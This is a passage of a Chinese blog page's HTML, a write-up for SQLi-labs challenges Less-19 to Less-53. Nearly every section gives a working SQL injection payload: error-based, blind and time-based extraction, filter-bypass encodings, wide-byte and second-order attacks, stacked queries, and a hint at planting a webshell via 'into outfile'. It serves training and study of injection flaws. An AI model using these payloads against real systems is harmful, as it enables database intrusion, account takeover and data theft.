+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=s1>&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and &#39;</span><span class=mi>1</span><span class=s1>&#39;=&#39;</span><span class=mi>1</span><span class=w>
+</span></code></pre></div><p>可以注入</p>
+<h3 id=less-20>Less-20</h3>
+<p>cookie 注入，登录成功后修改 cookie 即可</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=s1>&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and &#39;</span><span class=mi>1</span><span class=s1>&#39;=&#39;</span><span class=mi>1</span><span class=w>
+</span></code></pre></div><h3 id=less-21>Less-21</h3>
+<p>登录成功后发现 cookie 加上了 base64</p>
+<pre tabindex=0><code>YOUR COOKIE : uname = YWRtaW4=
+</code></pre><p>用上面的 payload 进行 base64 编码就行了，记得<code>=</code>要 urlencode</p>
+<pre tabindex=0><code>JyBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQHZlcnNpb24pLDB4N2UpLDEpIGFuZCAnMSc9JzE%3d
+</code></pre><h3 id=less-22>Less-22</h3>
+<p>同 21 ，单引号换成双引号即可</p>
+<pre tabindex=0><code>IiBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQHZlcnNpb24pLDB4N2UpLDEpIGFuZCAiMSI9IjE%3d
+</code></pre><h3 id=less-23>Less-23</h3>
+<p>这里<code>#</code>、<code>--+</code>均被过滤了，但是我们可以利用<code>or "1"="1</code>来闭合后面的双引号也可以达到我们的目的</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=o>-</span><span class=mi>1</span><span class=s1>&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) or &#39;</span><span class=mi>1</span><span class=s1>&#39;=&#39;</span><span class=mi>1</span><span class=w>
+</span></code></pre></div><h3 id=less-24>Less-24</h3>
+<p>这里是个二次注入，我们可以先注册一个<code>admin'#</code>的账号，在修改密码处我们就可以以自己的密码修改 admin 的密码了，因为修改密码处形成的 sql 语句是</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>UPDATE</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>SET</span><span class=w> </span><span class=n>passwd</span><span class=o>=</span><span class=s2>&#34;New_Pass&#34;</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>=</span><span class=s1>&#39;admin&#39;</span><span class=o>#</span><span class=s1>&#39;xxxx
+</span></code></pre></div><p>这样<code>#</code>就注释掉了后面的 sql 语句</p>
+<h3 id=less-25>Less-25</h3>
+<p>题目很直接，提示直接把 <code>or</code>、<code>and</code>过滤了，但是可以用<code>&&</code>、<code>||</code>绕过</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>admin</span><span class=s1>&#39;||updatexml(1,concat(0x7e,(select @@version),0x7e),1)#
+</span></code></pre></div><p>也可以双写绕过</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>0</span><span class=s1>&#39; union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata;#
+</span></code></pre></div><h3 id=less-25a>Less-25a</h3>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=o>-</span><span class=mi>1</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=n>group_concat</span><span class=p>(</span><span class=k>schema_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>infoorrmation_schema</span><span class=p>.</span><span class=n>schemata</span><span class=w> </span><span class=o>%</span><span class=mi>23</span><span class=w>
+</span></code></pre></div><h3 id=less-26>Less-26</h3>
+<p>题目提示空格与注释被过滤了，可以使用<code>%0a</code>绕过，可以盲注也可以报错注入</p>
+<pre tabindex=0><code>0'||left(database(),1)&gt;'s'%26%26'1'='1	
+0'||updatexml(1,concat(0x7e,(Select%0a@@version),0x7e),1)||'1'='1
+</code></pre><h3 id=less-26a>Less-26a</h3>
+<p>题目提示空格与注释被过滤了，可以使用<code>%a0</code>绕过，报错注入不出，可以用布尔盲注</p>
+<pre tabindex=0><code>0'||'1'='1	#探测为'
+0'||left(database(),1)='s'%26%26'1'='1
+
+白盒审计知道是')
+0%27)%a0union%a0select%a01,database(),2||('1
+0%27)%a0union%a0select%a01,database(),2;%00
+</code></pre><h3 id=less-27>Less-27</h3>
+<p>题目提示<code>union</code>与<code>select</code>被过滤了，可用大小写绕过</p>
+<pre tabindex=0><code>0'||'1'='1
+0'||left(database(),1)='s'%26%26'1'='1
+
+0'%0AunIon%0AselEct%0A1,group_concat(schema_name),2%0Afrom%0Ainformation_schema.schemata;%00
+</code></pre><h3 id=less-27a>Less-27a</h3>
+<p>增加了<code>"</code></p>
+<pre tabindex=0><code>0&quot;%0AunIon%0AselEct%0A1,group_concat(schema_name),2%0Afrom%0Ainformation_schema.schemata;%00
+</code></pre><h3 id=less-28>Less-28</h3>
+<p><code>union select</code>大小写均被过滤，但是<code>select</code>还可单独用，盲注即可</p>
+<pre tabindex=0><code>0')||left(database(),1)&gt;'s';%00
+</code></pre><h3 id=less-28a>Less-28a</h3>
+<p>依然可以用盲注</p>
+<pre tabindex=0><code>0')||left((database()),1)='s';%00
+0')||left((selEct%0agroup_concat(schema_name)%0afrom%0Ainformation_schema.schemata),1)&lt;'s';%00
+</code></pre><h3 id=less-29>Less-29</h3>
+<p>利用<code>tomcat</code>与<code>apache</code>解析相同请求参数不同的特性，<code>tomcat</code>解析相同请求参数取第一个，而<code>apache</code>取第二个，如<code>?id=1&id=2</code>，<code>tomcat</code>取得1，<code>apache</code>取得2</p>
+<pre tabindex=0><code>?id=1&amp;id=0' union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23
+</code></pre><h3 id=less-30>Less-30</h3>
+<p>与 29 架构一样，原理一致只不过加了<code>"</code>限制</p>
+<pre tabindex=0><code>?id=1&amp;id=0&quot; union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23
+</code></pre><h3 id=less-31>Less-31</h3>
+<p>架构一样，多了<code>")</code></p>
+<pre tabindex=0><code>?id=1&amp;id=0&quot;) union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23
+</code></pre><h3 id=less-32>Less-32</h3>
+<p>注意是<code>GBK</code>，可以用<code>%df</code>进行宽字节注入</p>
+<pre tabindex=0><code>0%df%27%20or%201=1%23
+0%df' union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23
+</code></pre><h3 id=less-33>Less-33</h3>
+<pre tabindex=0><code>0%df' union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23
+</code></pre><h3 id=less-34>Less-34</h3>
+<pre tabindex=0><code>uname=0%df'%20union+selEct%201,group_concat(schema_name)%20from%20information_schema.schemata%3b%23&amp;passwd=1&amp;submit=Submit
+</code></pre><h3 id=less-35>Less-35</h3>
+<pre tabindex=0><code>0 union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23
+</code></pre><h3 id=less-36>Less-36</h3>
+<pre tabindex=0><code>0%df%27%20union%20selEct%201,group_concat(schema_name),2%20from%20information_schema.schemata;%23
+-1%EF%BF%BD%27union%20select%201,user(),3--+
+</code></pre><h3 id=less-37>Less-37</h3>
+<pre tabindex=0><code>uname=0%df%27%20union%20selEct%20group_concat(schema_name),2%20from%20information_schema.schemata;%23&amp;passwd=1&amp;submit=Submit
+</code></pre><h3 id=less-38>Less-38</h3>
+<p>堆叠注入，成功创建<code>test</code>数据表</p>
+<pre tabindex=0><code>1';create table test like users;%23
+</code></pre><h3 id=less-39>Less-39</h3>
+<pre tabindex=0><code>1;create table test39 like users;%23
+</code></pre><h3 id=less-40>Less-40</h3>
+<pre tabindex=0><code>1');create table test40 like users;%23
+</code></pre><h3 id=less-41>Less-41</h3>
+<pre tabindex=0><code>1;create table test41 like users;%23
+</code></pre><h3 id=less-42>Less-42</h3>
+<p><code>password</code>处无过滤</p>
+<pre tabindex=0><code>login_user=1&amp;login_password=1'%3bcreate+table+test43+like+users%3b%23&amp;mysubmit=Login
+</code></pre><h3 id=less-43>Less-43</h3>
+<p><code>password</code>处无过滤</p>
+<pre tabindex=0><code>login_user=1&amp;login_password=1')%3bcreate+table+test43+like+users%3b%23&amp;mysubmit=Login
+</code></pre><h3 id=less-44>Less-44</h3>
+<pre tabindex=0><code>login_user=1&amp;login_password=1'%3bcreate+table+test44+like+users%3b%23&amp;mysubmit=Login
+</code></pre><h3 id=less-45>Less-45</h3>
+<pre tabindex=0><code>login_user=1&amp;login_password=1')%3bcreate+table+test45+like+users%3b%23&amp;mysubmit=Login
+</code></pre><h3 id=less-46>Less-46</h3>
+<p><code>order by</code>注入</p>
+<p><code>username</code>、<code>password</code>均为列名，所以以下需要知道列名</p>
+<pre tabindex=0><code>?order=if(1=1,username,password)
+?order=null,if(1=1,username,password)
+?order=(case when (1=1) then username else password end)
+?order=ifnull(null, username)
+?order=rand(1=1)    //order by rand(1)/rand(0)两者返回不一样
+?order=(select 1 regexp if(1=1,1,0x00))
+</code></pre><p>将<code>1=1</code>换成bool盲注的语句函数即可用于获取数据
+<code>sort=rand(ascii(database(),1))=115)</code></p>
+<p>时间盲注</p>
+<pre tabindex=0><code>sort=1 and if(ascii(substr(database(),1,1))=116,0,sleep(5))
+sort=(select if(substring(current,1,1)=char(115),benchmatrk(5000000,md5('1')),null) from (select database() as current) as tb1)
+</code></pre><p>Bool 盲注</p>
+<pre tabindex=0><code>rand(ascii(left(database()),1))=115)
+</code></pre><p>报错注入：</p>
+<pre tabindex=0><code>updatexml(1,if(1=1,concat(0x7e,version()),2),1)
+(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))
+</code></pre><p>procedure analyse 参数后注入</p>
+<pre tabindex=0><code>sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
+</code></pre><p>into outfile参数:</p>
+<pre tabindex=0><code>id=1 into outfield &quot;path&quot;
+</code></pre><p>上传网马，可以在后面加上<code>lines terminated by 16</code>进制转码的数据</p>
+<h3 id=less-47>Less-47</h3>
+<p>有<code>'</code>，可以用报错</p>
+<pre tabindex=0><code>1'and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))--+
+1'and (select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x)--+
+</code></pre><p>也可以用时间盲注</p>
+<pre tabindex=0><code>1'and If(ascii(substr(database(),1,1))=115,0,sleep (5))--+
+</code></pre><p>procedure analyse 参数后注入</p>
+<pre tabindex=0><code>1'procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)--+
+</code></pre><h3 id=less-48>Less-48</h3>
+<pre tabindex=0><code>1 and If(ascii(substr(database(),1,1))&gt;115,0,sleep (5))--+
+sort=rand(ascii(left(database(),1))=115)
+</code></pre><h3 id=less-49>Less-49</h3>
+<pre tabindex=0><code>1' and If(ascii(substr(database(),1,1))=115,0,sleep (5))--+
+1' and (If(ascii(substr((select username from users where id=1),1,1))=68,0,sleep(5)))--+
+</code></pre><h3 id=less-50>Less-50</h3>
+<p>堆叠注入</p>
+<pre tabindex=0><code>1;create table test50 like users;%23
+</code></pre><h3 id=less-51>Less-51</h3>
+<pre tabindex=0><code>1';create table test51 like users;%23
+</code></pre><h3 id=less-52>Less-52</h3>
+<pre tabindex=0><code>1;create table test52 like users;%23
+</code></pre><h3 id=less-53>Less-53</h3>
+<pre tabindex=0><code>1';create table test53 like users;%23
+</code></pre>
+</section>
+<footer class=article-footer>
+<section class=article-tags>
+<a href=/tags/Sec/>Sec</a>
+<a href=/tags/sql%E6%B3%A8%E5%85%A5/>sql注入</a>
+</section>
+<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span>
+</section>
+<div class="notice notice-tip">
+<div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div>
+<p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br>
+<p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br>
+</div>
+</footer>
+</article>
+<aside class=related-contents--wrapper>
+<h2 class=section-title>Related contents</h2>
+<div class=related-contents>
+<div class="flex article-list--tile">
+<article>
+<a href=/2019/03/08/Web-For-Pentest/>
+<div class=article-details>
+<h2 class=article-title>Web For Pentest</h2>
+</div>
+</a>
+</article>
+<article>
+<a href=/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/>
+<div class=article-details>
+<h2 class=article-title>Sql注入备忘录</h2>
+</div>
+</a>
+</article>
+<article>
+<a href=/2019/03/04/Sqli-lab-Challenges-Write-up/>
+<div class=article-details>
+<h2 class=article-title>Sqli-lab Challenges Write up</h2>
+</div>
+</a>
+</article>
+<article>
+<a href=/2021/04/20/tls-poison/>
+<div class=article-details>
+<h2 class=article-title>一篇文章带你读懂 TLS Poison 攻击</h2>
+</div>
+</a>
+</article>
+<article>
+<a href=/2019/12/08/HTTP-Smuggling-en/>
+<div class=article-details>
+<h2 class=article-title>Help you understand HTTP Smuggling in one article</h2>
+</div>
+</a>
+</article>
+</div>
+</div>
+</aside>
+<div class=disqus-container>
+<div id=disqus_thread></div>
+<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//ZeddYu.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
+<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
+<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
+</div>
+<style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style>
+<script>window.addEventListener('onColorSchemeChange',a=>{DISQUS&&DISQUS.reset({reload:!0})})</script>
+<footer class=site-footer>
+<section class=copyright>
+&copy;
+2018 -
+2021 Zeddy's Blog
+</section>
+<section class=powerby>
+Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
+Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
+</section>
+</footer>
+<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
+<div class=pswp__bg></div>
+<div class=pswp__scroll-wrap>
+<div class=pswp__container>
+<div class=pswp__item></div>
+<div class=pswp__item></div>
+<div class=pswp__item></div>
+</div>
+<div class="pswp__ui pswp__ui--hidden">
+<div class=pswp__top-bar>
+<div class=pswp__counter></div>
+<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+<div class=pswp__preloader>
+<div class=pswp__preloader__icn>
+<div class=pswp__preloader__cut>
+<div class=pswp__preloader__donut></div>
+</div>
+</div>
+</div>
+</div>
+<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+<div class=pswp__share-tooltip></div>
+</div>
+<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+</button>
+<div class=pswp__caption>
+<div class=pswp__caption__center></div>
+</div>
+</div>
+</div>
+</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
+</main>
+<aside class="sidebar right-sidebar sticky">
+<section class="widget archives">
+<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
+</div>
+<h2 class="widget-title section-title">Table of contents</h2>
+<div class=widget--toc>
+<nav id=TableOfContents>
+<ol>
+<li><a href=#preparation>Preparation</a></li>
+<li><a href=#basic>Basic</a></li>
+<li><a href=#sqli-labs-page-1basic-challenges>SQLi-LABS Page-1(Basic Challenges)</a>
+<ol>
+<li><a href=#less-1>Less-1</a></li>
+<li><a href=#less-2>Less-2</a></li>
+<li><a href=#less-3>Less-3</a></li>
+<li><a href=#less-4>Less-4</a></li>
+<li><a href=#less-5>Less-5</a>
+<ol>
+<li><a href=#使用left>使用left()</a></li>
+<li><a href=#使用substrascii>使用substr()、ascii()</a></li>
+<li><a href=#使用regexp>使用regexp()</a></li>
+<li><a href=#使用ordmid>使用ord()、mid()</a></li>
+<li><a href=#使用报错注入>使用报错注入</a></li>
+<li><a href=#使用延时注入>使用延时注入</a></li>
+</ol>
+</li>
+<li><a href=#less-6>Less-6</a></li>
+<li><a href=#less-7>Less-7</a></li>
+<li><a href=#less-8>Less-8</a></li>
+<li><a href=#less-9>Less-9</a></li>
+<li><a href=#less-10>Less-10</a></li>
+<li><a href=#less-11>Less-11</a></li>
+<li><a href=#less-12>Less-12</a></li>
+<li><a href=#less-13>Less-13</a></li>
+<li><a href=#less-14>Less-14</a></li>
+<li><a href=#less-15>Less-15</a></li>
+<li><a href=#less-16>Less-16</a></li>
+<li><a href=#less-17>Less-17</a></li>
+<li><a href=#less-18>Less-18</a></li>
+<li><a href=#less-19>Less-19</a></li>
+<li><a href=#less-20>Less-20</a></li>
+<li><a href=#less-21>Less-21</a></li>
+<li><a href=#less-22>Less-22</a></li>
+<li><a href=#less-23>Less-23</a></li>
+<li><a href=#less-24>Less-24</a></li>
+<li><a href=#less-25>Less-25</a></li>
+<li><a href=#less-25a>Less-25a</a></li>
+<li><a href=#less-26>Less-26</a></li>
+<li><a href=#less-26a>Less-26a</a></li>
+<li><a href=#less-27>Less-27</a></li>
+<li><a href=#less-27a>Less-27a</a></li>
+<li><a href=#less-28>Less-28</a></li>
+<li><a href=#less-28a>Less-28a</a></li>
+<li><a href=#less-29>Less-29</a></li>
+<li><a href=#less-30>Less-30</a></li>
+<li><a href=#less-31>Less-31</a></li>
+<li><a href=#less-32>Less-32</a></li>
+<li><a href=#less-33>Less-33</a></li>
+<li><a href=#less-34>Less-34</a></li>
+<li><a href=#less-35>Less-35</a></li>
+<li><a href=#less-36>Less-36</a></li>
+<li><a href=#less-37>Less-37</a></li>
+<li><a href=#less-38>Less-38</a></li>
+<li><a href=#less-39>Less-39</a></li>
+<li><a href=#less-40>Less-40</a></li>
+<li><a href=#less-41>Less-41</a></li>
+<li><a href=#less-42>Less-42</a></li>
+<li><a href=#less-43>Less-43</a></li>
+<li><a href=#less-44>Less-44</a></li>
+<li><a href=#less-45>Less-45</a></li>
+<li><a href=#less-46>Less-46</a></li>
+<li><a href=#less-47>Less-47</a></li>
+<li><a href=#less-48>Less-48</a></li>
+<li><a href=#less-49>Less-49</a></li>
+<li><a href=#less-50>Less-50</a></li>
+<li><a href=#less-51>Less-51</a></li>
+<li><a href=#less-52>Less-52</a></li>
+<li><a href=#less-53>Less-53</a></li>
+</ol>
+</li>
+</ol>
+</nav>
+</div>
+</section>
+</aside>
+</div>
+<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=/ts/main.js defer></script>
+<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
+</body>
+</html>
